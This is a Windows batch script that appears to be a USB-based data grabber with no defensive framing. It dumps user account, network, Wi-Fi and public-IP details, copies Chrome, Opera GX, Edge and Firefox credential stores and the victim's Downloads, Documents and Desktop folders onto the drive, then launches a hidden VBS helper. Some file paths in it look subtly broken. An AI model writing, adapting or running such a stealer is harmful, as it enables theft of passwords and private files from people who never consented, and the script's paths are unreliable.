cd out
mkdir inf
mkdir lgdat
mkdir dl
cd ..

:: cua - computer user accounts
net users > %CD:~0,2%\out\inf\cua.txt
:: cui - current user info
net user %username% > %CD:~0,2%\out\inf\cui.txt
:: ip - ipconfig
ipconfig /all > %CD:~0,2%\out\inf\ip.txt
:: sn - wifi info
netsh wlan show networks > %CD:~0,2%\out\inf\sn.txt
:: pip - public ip
nslookup myip.opendns.com resolver1.opendns.com > %CD:~0,2%\out\inf\pip.txt
:: drive info
wmic logicaldisk get deviceid, volumename, description > %CD:~0,2%\out\inf\driveinfo.txt

:: copying chrome passwords
xcopy "C:\Users\%username%\AppData\Local\Google\Chrome\User\Data\Default\Login Data" "%CD:~0,2%\out\lgdat\" /y
::copying opera gx passwords
xcopy "C:\Users\%username%\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" "%CD:~0,2%\out\lgdat\" /y
:: copying edge passwords
xcopy "C:\Users\%username%\AppData\Local\Microsoft\Vault\" /s "%CD:~0,2%\out\lgdat\" /y
:: copying firefox passwords
xcopy "C:\Users\%username%\AppData\Mozilla\Firefox\Profiles\" /s "%CD:~0,2%\out\lgdat\" /y

xcopy C:\Users\%username%\Downloads\ %CD:~0,2%\out\dl\ /e /h
xcopy C:\Users\%username%\Documents\ %CD:~0,2%\out\dl\ /e /h
xcopy C:\Users\%username%\Desktop\ %CD:~0,2%\out\dl\ /e /h

wscript.exe "invis.vbs" eject.bat
